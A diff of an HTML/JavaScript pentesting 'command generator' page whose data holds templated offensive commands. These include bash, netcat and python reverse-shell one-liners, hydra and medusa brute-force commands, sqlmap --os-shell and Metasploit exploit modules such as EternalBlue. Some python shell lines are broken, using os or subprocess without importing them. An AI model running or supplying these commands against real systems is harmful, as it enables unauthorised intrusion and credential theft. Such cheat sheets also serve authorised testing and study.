@@ -3,214 +3,305 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>DarkCyberGroot Pentesting Command Generator</title>
+    <title>DarkCyberGroot Command Generator</title>
     <style>
         body {
-            background-color: #2e2e2e;
-            color: #f5f5f5;
-            font-family: Arial, sans-serif;
+            background-color: #000;
+            color: #e0e0e0;
+            font-family: 'Roboto', sans-serif;
+            margin: 0;
+            padding: 0;
         }
         .container {
             width: 80%;
-            margin: 0 auto;
-            padding-top: 20px;
+            margin: 20px auto;
+            padding: 20px;
+            background-color: #111;
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.5);
         }
         h1 {
             text-align: center;
+            color: #32CD32; /* Softer green */
             margin-bottom: 20px;
+            text-shadow: 2px 2px 4px #32CD32;
         }
         .tool {
             margin-bottom: 20px;
         }
-        input[type="text"] {
-            width: 80%;
-            padding: 10px;
-            background-color: #444;
-            color: #fff;
-            border: 1px solid #555;
-            margin-right: 10px;
-        }
-        select {
-            padding: 10px;
-            background-color: #444;
-            color: #fff;
-            border: 1px solid #555;
+        input[type="text"], select {
+            width: 100%;
+            padding: 12px;
+            background-color: #1b1b1b;
+            color: #32CD32; /* Softer green */
+            border: 2px solid #333;
+            border-radius: 5px;
+            margin-bottom: 20px;
+            box-sizing: border-box;
         }
         button {
-            padding: 10px 20px;
-            background-color: #555;
-            color: #fff;
+            width: 100%;
+            padding: 12px;
+            background-color: #32CD32; /* Softer green */
+            color: #000;
+            font-weight: bold;
             border: none;
+            border-radius: 5px;
             cursor: pointer;
-            margin-top: 10px;
+            margin-bottom: 20px;
+            transition: 0.3s ease;
         }
         button:hover {
-            background-color: #666;
+            background-color: #2e8b57; /* Darker green on hover */
+            color: #fff;
         }
         pre {
-            background-color: #1e1e1e;
-            color: #f5f5f5;
+            background-color: #121212;
+            color: #32CD32; /* Softer green */
+            padding: 15px;
+            border: 2px solid #333;
+            border-radius: 5px;
+            margin-bottom: 20px;
+            max-height: 300px;
+            overflow-y: auto;
+            font-family: monospace;
+            font-size: 14px;
+        }
+        .history {
+            background-color: #1b1b1b;
             padding: 10px;
-            border: 1px solid #444;
-            overflow-x: auto;
-            margin-top: 20px;
+            color: #f5f5f5;
+            border: 2px solid #333;
+            border-radius: 5px;
+            font-family: monospace;
+            font-size: 14px;
+            max-height: 200px;
+            overflow-y: auto;
+        }
+        .dropdowns {
+            display: flex;
+            flex-direction: column;
+        }
+        .dropdowns select {
+            margin-bottom: 15px;
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>Pentesting Toolkit Command Generator</h1>
+        <h1>DarkCyberGroot Command Generator</h1>
 
         <div class="tool">
             <input type="text" id="target_input" placeholder="Enter IP/URL">
+        </div>
+
+        <div class="dropdowns">
+            <select id="category_select" onchange="populateTools()">
+                <option value="" disabled selected>Select a Category</option>
+                <option value="password_attacks">Password Attacks</option>
+                <option value="directory_listing">Directory Listings</option>
+                <option value="network_scanning">Network Scanning</option>
+                <option value="web_scanning">Web Scanning</option>
+                <option value="exploitation">Exploitation</option>
+                <option value="file_transfer">File Transfer</option>
+                <option value="reverse_shells">Reverse Shells</option>
+                <option value="info_gathering">Information Gathering</option>
+            </select>
+
             <select id="tool_select" onchange="generateCommands()">
                 <option value="" disabled selected>Select a Tool</option>
-                <option value="nmap">Nmap</option>
-                <option value="nikto">Nikto</option>
-                <option value="gobuster">Gobuster</option>
-                <option value="sqlmap">SQLmap</option>
-                <option value="metasploit">Metasploit</option>
-                <option value="hydra">Hydra</option>
-                <option value="john">John the Ripper</option>
-                <option value="burpsuite">Burp Suite</option>
-                <option value="wpscan">Wpscan</option>
-                <option value="netcat">Netcat</option>
             </select>
         </div>
 
         <div class="tool">
             <select id="command_select" onchange="displayCommand()">
                 <option value="" disabled selected>Select a Command</option>
-                <!-- Commands will be dynamically inserted here -->
             </select>
         </div>
 
-        <pre id="command_output"></pre>
+        <h3>Command Output</h3>
+        <pre id="command_output">Command output will appear here...</pre>
+
+        <h3>Command History (Last 10)</h3>
+        <div class="history" id="command_history">
+            No commands ran yet.
+        </div>
     </div>
 
     <script>
+        const commandHistory = [];
+        const maxHistory = 10;
+
+        const categorizedTools = {
+            password_attacks: ["hydra", "john", "medusa"],
+            directory_listing: ["gobuster", "dirb", "feroxbuster"],
+            network_scanning: ["nmap", "masscan", "netcat"],
+            web_scanning: ["nikto", "wpscan", "whatweb"],
+            exploitation: ["metasploit", "sqlmap", "exploitdb"],
+            file_transfer: ["scp", "ftp", "curl"],
+            reverse_shells: ["nc", "bash", "python"],
+            info_gathering: ["whois", "dig", "theharvester"]
+        };
+
         const commands = {
             nmap: [
-                "nmap -sV [TARGET]",
-                "nmap -O [TARGET]",
-                "nmap -p 1-65535 -sV -sS -T4 [TARGET]",
-                "nmap --script vuln [TARGET]",
-                "nmap -A [TARGET]",
-                "nmap -Pn [TARGET]",
-                "nmap -sS -sU -T4 [TARGET]",
-                "nmap -sP [TARGET]",
-                "nmap -sC [TARGET]",
-                "nmap -sn [TARGET]"
-            ],
-            nikto: [
-                "nikto -h [TARGET]",
-                "nikto -h [TARGET] -ssl",
-                "nikto -h [TARGET] -p 443",
-                "nikto -h [TARGET] -Tuning x 6",
-                "nikto -h [TARGET] -o output.txt",
-                "nikto -h [TARGET] -Format html",
-                "nikto -h [TARGET] -Plugins",
-                "nikto -h [TARGET] -Cgidirs /cgi-bin/",
-                "nikto -h [TARGET] -Display V",
-                "nikto -h [TARGET] -evasion 1"
-            ],
-            gobuster: [
-                "gobuster dir -u [TARGET] -w wordlist.txt",
-                "gobuster dns -d [TARGET] -w wordlist.txt",
-                "gobuster vhost -u [TARGET] -w wordlist.txt",
-                "gobuster dir -u [TARGET] -w wordlist.txt -x php,html,txt",
-                "gobuster dir -u [TARGET] -w wordlist.txt -t 50",
-                "gobuster dir -u [TARGET] -w wordlist.txt -o output.txt",
-                "gobuster dir -u [TARGET] -w wordlist.txt -r",
-                "gobuster dir -u [TARGET] -w wordlist.txt -s '200,204,301,302,307,403'",
-                "gobuster dir -u [TARGET] -w wordlist.txt -k",
-                "gobuster dir -u [TARGET] -w wordlist.txt -l"
-            ],
-            sqlmap: [
-                "sqlmap -u [TARGET] --dbs",
-                "sqlmap -u [TARGET] -D [DB_NAME] --tables",
-                "sqlmap -u [TARGET] -D [DB_NAME] -T [TABLE_NAME] --columns",
-                "sqlmap -u [TARGET] -D [DB_NAME] -T [TABLE_NAME] --dump",
-                "sqlmap -u [TARGET] --batch",
-                "sqlmap -u [TARGET] --level=5 --risk=3",
-                "sqlmap -u [TARGET] --crawl=10",
-                "sqlmap -u [TARGET] --threads=10",
-                "sqlmap -u [TARGET] --os-shell",
-                "sqlmap -u [TARGET] --dbms=mysql"
-            ],
-            metasploit: [
-                "msfconsole -q -x 'use exploit/multi/handler'",
-                "msfconsole -q -x 'use exploit/windows/smb/ms17_010_eternalblue'",
-                "msfconsole -q -x 'use exploit/unix/ftp/vsftpd_234_backdoor'",
-                "msfconsole -q -x 'use exploit/linux/http/apache_mod_cgi_bash_env_exec'",
-                "msfconsole -q -x 'use exploit/windows/http/rejetto_hfs_exec'",
-                "msfconsole -q -x 'use exploit/multi/http/struts2_content_type_ognl'",
-                "msfconsole -q -x 'use exploit/windows/browser/ms14_064_ole_code_execution'",
-                "msfconsole -q -x 'use exploit/unix/webapp/drupal_drupalgeddon2'",
-                "msfconsole -q -x 'use exploit/linux/local/dirtycow'",
-                "msfconsole -q -x 'use auxiliary/scanner/smb/smb_version'"
+                "nmap -sV [TARGET]", "nmap -O [TARGET]", "nmap --script vuln [TARGET]",
+                "nmap -p 1-65535 -sV -sS -T4 [TARGET]", "nmap -A [TARGET]", "nmap -Pn [TARGET]",
+                "nmap -sS -sU -T4 [TARGET]", "nmap -sP [TARGET]", "nmap -sC [TARGET]", "nmap -sn [TARGET]"
             ],
             hydra: [
                 "hydra -l admin -P password_list.txt [TARGET] http-post-form '/login.php:user=^USER^&pass=^PASS^:F=incorrect'",
-                "hydra -L users.txt -P passwords.txt [TARGET] ssh",
-                "hydra -l admin -P password_list.txt [TARGET] ftp",
-                "hydra -l admin -P password_list.txt [TARGET] smb",
-                "hydra -l admin -P password_list.txt [TARGET] telnet",
-                "hydra -l admin -P password_list.txt [TARGET] rdp",
-                "hydra -l admin -P password_list.txt [TARGET] smtp",
-                "hydra -l admin -P password_list.txt [TARGET] snmp",
-                "hydra -l admin -P password_list.txt [TARGET] http-get",
+                "hydra -L users.txt -P passwords.txt [TARGET] ssh", "hydra -l admin -P password_list.txt [TARGET] ftp",
+                "hydra -l admin -P password_list.txt [TARGET] smb", "hydra -l admin -P password_list.txt [TARGET] telnet",
+                "hydra -l admin -P password_list.txt [TARGET] rdp", "hydra -l admin -P password_list.txt [TARGET] smtp",
+                "hydra -l admin -P password_list.txt [TARGET] snmp", "hydra -l admin -P password_list.txt [TARGET] http-get",
                 "hydra -l admin -P password_list.txt [TARGET] http-head"
             ],
             john: [
-                "john --wordlist=password_list.txt [TARGET]",
-                "john --rules --wordlist=password_list.txt [TARGET]",
-                "john --incremental [TARGET]",
-                "john --show [TARGET]",
-                "john --single [TARGET]",
-                "john --wordlist=password_list.txt --format=raw-md5 [TARGET]",
-                "john --wordlist=password_list.txt --format=nt [TARGET]",
-                "john --wordlist=password_list.txt --session=crack_session [TARGET]",
-                "john --wordlist=password_list.txt --format=zip [TARGET]",
+                "john --wordlist=password_list.txt [TARGET]", "john --rules --wordlist=password_list.txt [TARGET]",
+                "john --incremental [TARGET]", "john --show [TARGET]", "john --single [TARGET]",
+                "john --wordlist=password_list.txt --format=raw-md5 [TARGET]", "john --wordlist=password_list.txt --format=nt [TARGET]",
+                "john --wordlist=password_list.txt --session=crack_session [TARGET]", "john --wordlist=password_list.txt --format=zip [TARGET]",
                 "john --restore=crack_session"
             ],
-            burpsuite: [
-                "Burp Suite (requires manual execution from GUI)",
-                "Burp Suite with Intruder for brute force",
-                "Burp Suite with Repeater for manual testing",
-                "Burp Suite with Scanner for vulnerability detection",
-                "Burp Suite with Spider for content discovery",
-                "Burp Suite with Proxy for intercepting requests",
-                "Burp Suite with Sequencer for token analysis",
-                "Burp Suite with Decoder for decoding data",
-                "Burp Suite with Comparer for comparing requests",
-                "Burp Suite with Extender for custom extensions"
+            medusa: [
+                "medusa -h [TARGET] -U users.txt -P passwords.txt -M ssh", "medusa -h [TARGET] -U users.txt -P passwords.txt -M ftp",
+                "medusa -h [TARGET] -U users.txt -P passwords.txt -M smb", "medusa -h [TARGET] -U users.txt -P passwords.txt -M http",
+                "medusa -h [TARGET] -U users.txt -P passwords.txt -M telnet", "medusa -h [TARGET] -U users.txt -P passwords.txt -M rdp",
+                "medusa -h [TARGET] -U users.txt -P passwords.txt -M vnc", "medusa -h [TARGET] -U users.txt -P passwords.txt -M mysql",
+                "medusa -h [TARGET] -U users.txt -P passwords.txt -M snmp", "medusa -h [TARGET] -U users.txt -P passwords.txt -M imap"
+            ],
+            gobuster: [
+                "gobuster dir -u [TARGET] -w wordlist.txt", "gobuster dns -d [TARGET] -w wordlist.txt",
+                "gobuster vhost -u [TARGET] -w wordlist.txt", "gobuster dir -u [TARGET] -w wordlist.txt -x php,html,txt",
+                "gobuster dir -u [TARGET] -w wordlist.txt -t 50", "gobuster dir -u [TARGET] -w wordlist.txt -o output.txt",
+                "gobuster dir -u [TARGET] -w wordlist.txt -r", "gobuster dir -u [TARGET] -w wordlist.txt -s '200,204,301,302,307,403'",
+                "gobuster dir -u [TARGET] -w wordlist.txt -k", "gobuster dir -u [TARGET] -w wordlist.txt -l"
+            ],
+            dirb: [
+                "dirb http://[TARGET]/", "dirb http://[TARGET]/ /path/to/wordlist.txt", "dirb http://[TARGET]/ -X .php",
+                "dirb http://[TARGET]/ -r", "dirb http://[TARGET]/ -S", "dirb http://[TARGET]/ -o dirb_output.txt",
+                "dirb http://[TARGET]/ -p 8080", "dirb http://[TARGET]/ -a 'Mozilla/5.0'", "dirb http://[TARGET]/ -c 'cookie=value'",
+                "dirb http://[TARGET]/ -N 404"
+            ],
+            feroxbuster: [
+                "feroxbuster -u http://[TARGET]/ -w /path/to/wordlist.txt", "feroxbuster -u http://[TARGET]/ --silent",
+                "feroxbuster -u http://[TARGET]/ --depth 3", "feroxbuster -u http://[TARGET]/ --status-codes '200,301,302'",
+                "feroxbuster -u http://[TARGET]/ -x php,html,txt", "feroxbuster -u http://[TARGET]/ --extract-links",
+                "feroxbuster -u http://[TARGET]/ -o output.txt", "feroxbuster -u http://[TARGET]/ --rate-limit 50",
+                "feroxbuster -u http://[TARGET]/ --replay-proxy http://localhost:8080", "feroxbuster -u http://[TARGET]/ --follow-redirects"
+            ],
+            nikto: [
+                "nikto -h [TARGET]", "nikto -h [TARGET] -ssl", "nikto -h [TARGET] -p 443", "nikto -h [TARGET] -Tuning x 6",
+                "nikto -h [TARGET] -o output.txt", "nikto -h [TARGET] -Format html", "nikto -h [TARGET] -Plugins",
+                "nikto -h [TARGET] -Cgidirs /cgi-bin/", "nikto -h [TARGET] -Display V", "nikto -h [TARGET] -evasion 1"
             ],
             wpscan: [
-                "wpscan --url [TARGET]",
-                "wpscan --url [TARGET] --enumerate p",
-                "wpscan --url [TARGET] --enumerate u",
-                "wpscan --url [TARGET] --enumerate t",
-                "wpscan --url [TARGET] --api-token [API_TOKEN]",
-                "wpscan --url [TARGET] --passwords password_list.txt",
-                "wpscan --url [TARGET] --random-agent",
-                "wpscan --url [TARGET] --wp-content-dir wp-content",
-                "wpscan --url [TARGET] --usernames admin",
+                "wpscan --url [TARGET]", "wpscan --url [TARGET] --enumerate p", "wpscan --url [TARGET] --enumerate u",
+                "wpscan --url [TARGET] --enumerate t", "wpscan --url [TARGET] --api-token [API_TOKEN]",
+                "wpscan --url [TARGET] --passwords password_list.txt", "wpscan --url [TARGET] --random-agent",
+                "wpscan --url [TARGET] --wp-content-dir wp-content", "wpscan --url [TARGET] --usernames admin",
                 "wpscan --url [TARGET] --plugins-detection aggressive"
             ],
-            netcat: [
-                "nc -lvp [PORT]",
-                "nc -v [TARGET] [PORT]",
-                "nc -nvv [TARGET] [PORT]",
-                "nc -zv [TARGET] [PORT_RANGE]",
-                "nc -lvp [PORT] > received_file",
-                "nc -nv [TARGET] [PORT] < file_to_send",
-                "nc -e /bin/sh [TARGET] [PORT]",
-                "nc -e cmd.exe [TARGET] [PORT]",
-                "nc -zv [TARGET] 1-65535",
+            whatweb: [
+                "whatweb [TARGET]", "whatweb -v [TARGET]", "whatweb --color=never [TARGET]", "whatweb --log-xml=output.xml [TARGET]",
+                "whatweb --no-errors [TARGET]", "whatweb --max-redirects=3 [TARGET]", "whatweb --proxy 127.0.0.1:8080 [TARGET]",
+                "whatweb --follow-redirect=always [TARGET]", "whatweb --user-agent 'Mozilla/5.0' [TARGET]", "whatweb --log-json=output.json [TARGET]"
+            ],
+            sqlmap: [
+                "sqlmap -u [TARGET] --dbs", "sqlmap -u [TARGET] -D [DB_NAME] --tables", "sqlmap -u [TARGET] -D [DB_NAME] -T [TABLE_NAME] --columns",
+                "sqlmap -u [TARGET] -D [DB_NAME] -T [TABLE_NAME] --dump", "sqlmap -u [TARGET] --batch",
+                "sqlmap -u [TARGET] --level=5 --risk=3", "sqlmap -u [TARGET] --crawl=10", "sqlmap -u [TARGET] --threads=10",
+                "sqlmap -u [TARGET] --os-shell", "sqlmap -u [TARGET] --dbms=mysql"
+            ],
+            metasploit: [
+                "msfconsole -q -x 'use exploit/multi/handler'", "msfconsole -q -x 'use exploit/windows/smb/ms17_010_eternalblue'",
+                "msfconsole -q -x 'use exploit/unix/ftp/vsftpd_234_backdoor'", "msfconsole -q -x 'use exploit/linux/local/dirtycow'",
+                "msfconsole -q -x 'use exploit/unix/webapp/drupal_drupalgeddon2'", "msfconsole -q -x 'use exploit/windows/browser/ms14_064_ole_code_execution'",
+                "msfconsole -q -x 'use auxiliary/scanner/smb/smb_version'", "msfconsole -q -x 'use auxiliary/scanner/ssh/ssh_version'",
+                "msfconsole -q -x 'use auxiliary/scanner/http/http_version'", "msfconsole -q -x 'use auxiliary/scanner/ftp/ftp_version'"
+            ],
+            exploitdb: [
+                "searchsploit [TARGET]", "searchsploit --www [TARGET]", "searchsploit --exclude '/path/to/exclude' [TARGET]",
+                "searchsploit -w --mirror [TARGET]", "searchsploit --author [AUTHOR_NAME]", "searchsploit --id 39427",
+                "searchsploit --search 'Microsoft Windows'", "searchsploit --verbose", "searchsploit --update",
+                "searchsploit --help"
+            ],
+            scp: [
+                "scp file.txt user@[TARGET]:/path/to/destination", "scp user@[TARGET]:/path/to/file ./destination_folder",
+                "scp -r folder/ user@[TARGET]:/path/to/destination", "scp -P 2222 file.txt user@[TARGET]:/path/to/destination",
+                "scp -i private_key.pem file.txt user@[TARGET]:/path/to/destination", "scp file.txt user@[TARGET]:~/",
+                "scp -C file.txt user@[TARGET]:/path/to/destination", "scp -o 'StrictHostKeyChecking no' file.txt user@[TARGET]:/path/to/destination",
+                "scp user@[TARGET]:/path/to/remote_file ./local_file", "scp -p file.txt user@[TARGET]:/path/to/destination"
+            ],
+            ftp: [
+                "ftp [TARGET]", "put file.txt", "get file.txt", "mput *.txt", "mget *.txt", "delete file.txt",
+                "mkdir new_folder", "rmdir old_folder", "ls", "bye"
+            ],
+            curl: [
+                "curl -O [TARGET]/file.zip", "curl -u user:password [TARGET]/file.zip -o output.zip", "curl -I [TARGET]",
+                "curl -X POST -d 'user=user&pass=pass' [TARGET]", "curl -u user:password [TARGET] -o output.txt",
+                "curl --proxy 127.0.0.1:8080 [TARGET]", "curl -s -k -L [TARGET]", "curl -A 'Mozilla/5.0' [TARGET]",
+                "curl -v [TARGET]", "curl --cookie 'name=value' [TARGET]"
+            ],
+            nc: [
+                "nc -lvp [PORT]", "nc -e /bin/bash [TARGET] [PORT]", "nc -l -p [PORT] -e /bin/bash",
+                "nc -nv [TARGET] [PORT] < file_to_send", "nc -zv [TARGET] 1-65535", "nc -nvv [TARGET] [PORT]",
+                "nc -lvp [PORT] > received_file", "nc -nv [TARGET] [PORT] < file_to_send", "nc -e cmd.exe [TARGET] [PORT]",
                 "nc -l -p [PORT] -e /bin/bash"
+            ],
+            bash: [
+                "bash -i >& /dev/tcp/[TARGET]/[PORT] 0>&1", "0<&196;exec 196<>/dev/tcp/[TARGET]/[PORT]; sh <&196 >&196 2>&196",
+                "exec 5<>/dev/tcp/[TARGET]/[PORT]; cat <&5 | while read line; do $line 2>&5 >&5; done",
+                "bash -c 'bash -i >& /dev/tcp/[TARGET]/[PORT] 0>&1'", "/bin/bash -i > /dev/tcp/[TARGET]/[PORT] 0<&1 2>&1",
+                "exec 5<>/dev/tcp/[TARGET]/[PORT];cat <&5|while read line;do $line 2>&5>&5;done", "bash -i >& /dev/tcp/[TARGET]/[PORT] 0>&1",
+                "sh -i >& /dev/tcp/[TARGET]/[PORT] 0>&1", "bash -c 'exec 5<>/dev/tcp/[TARGET]/[PORT]; cat <&5 | while read line; do $line 2>&5 >&5; done'",
+                "sh -c 'sh -i >& /dev/tcp/[TARGET]/[PORT] 0>&1'"
+            ],
+            python: [
+                "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"[TARGET]\",[PORT]));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"])'",
+                "python3 -c 'import os,socket,subprocess;s=socket.socket();s.connect((\"[TARGET]\",[PORT]));[os.dup2(s.fileno(),x)for x in(0,1,2)];subprocess.call([\"/bin/sh\",\"-i\"])'",
+                "python -c 'import socket; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"[TARGET]\",[PORT])); os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2); os.system(\"/bin/sh\")'",
+                "python3 -c 'import os,pty,socket;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"[TARGET]\",[PORT]));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'",
+                "python -c 'import socket; s=socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect((\"[TARGET]\", [PORT])); os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2); subprocess.call([\"/bin/sh\"])'",
+                "python3 -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"[TARGET]\",[PORT]));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'",
+                "python3 -c 'import socket; s=socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect((\"[TARGET]\", [PORT])); os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2); subprocess.call([\"/bin/sh\"])'",
+                "python -c 'import socket; s=socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect((\"[TARGET]\", [PORT])); os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2); os.system(\"/bin/bash\")'",
+                "python3 -c 'import os,socket; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"[TARGET]\",[PORT])); os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\"])'",
+                "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"[TARGET]\",[PORT]));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\"])'"
+            ],
+            whois: [
+                "whois [TARGET]", "whois [TARGET] | grep 'Registrar'", "whois [TARGET] | grep 'Name Server'", "whois [TARGET] | grep 'Updated Date'",
+                "whois [TARGET] | grep 'Creation Date'", "whois [TARGET] | grep 'Expiration Date'", "whois [TARGET] | grep 'Domain Status'",
+                "whois [TARGET] | grep 'Tech Contact'", "whois [TARGET] | grep 'Admin Contact'", "whois [TARGET] | grep 'Registrant Contact'"
+            ],
+            dig: [
+                "dig [TARGET]", "dig A [TARGET]", "dig MX [TARGET]", "dig TXT [TARGET]", "dig NS [TARGET]", "dig ANY [TARGET]",
+                "dig [TARGET] +trace", "dig [TARGET] +short", "dig [TARGET] +noall +answer", "dig [TARGET] -t SRV"
+            ],
+            theharvester: [
+                "theHarvester -d [TARGET] -l 500 -b google", "theHarvester -d [TARGET] -b all", "theHarvester -d [TARGET] -b bing",
+                "theHarvester -d [TARGET] -b linkedin", "theHarvester -d [TARGET] -b twitter", "theHarvester -d [TARGET] -b baidu",
+                "theHarvester -d [TARGET] -b google -f report.html", "theHarvester -d [TARGET] -b all -f report.html",
+                "theHarvester -d [TARGET] -b github", "theHarvester -d [TARGET] -b virustotal"
             ]
         };
+
+        function populateTools() {
+            var category = document.getElementById("category_select").value;
+            var toolSelect = document.getElementById("tool_select");
+
+            // Clear previous tools
+            toolSelect.innerHTML = '<option value="" disabled selected>Select a Tool</option>';
+
+            // Populate with tools from the selected category
+            categorizedTools[category].forEach(function(tool) {
+                var option = document.createElement("option");
+                option.value = tool;
+                option.text = tool.charAt(0).toUpperCase() + tool.slice(1);
+                toolSelect.appendChild(option);
+            });
+        }
 
         function generateCommands() {
             var tool = document.getElementById("tool_select").value;
@@ -232,6 +323,32 @@
         function displayCommand() {
             var command = document.getElementById("command_select").value;
             document.getElementById("command_output").textContent = command;
+
+            // Store command in history
+            addCommandToHistory(command);
+        }
+
+        function addCommandToHistory(command) {
+            // Add new command to history
+            commandHistory.unshift(command);
+
+            // Keep history to a max of 10 commands
+            if (commandHistory.length > maxHistory) {
+                commandHistory.pop();
+            }
+
+            // Display updated command history
+            displayCommandHistory();
+        }
+
+        function displayCommandHistory() {
+            var historyElement = document.getElementById("command_history");
+
+            if (commandHistory.length === 0) {
+                historyElement.textContent = "No commands ran yet.";
+            } else {
+                historyElement.innerHTML = commandHistory.map((cmd, index) => `${index + 1}. ${cmd}`).join('<br>');
+            }
         }
     </script>
 </body>
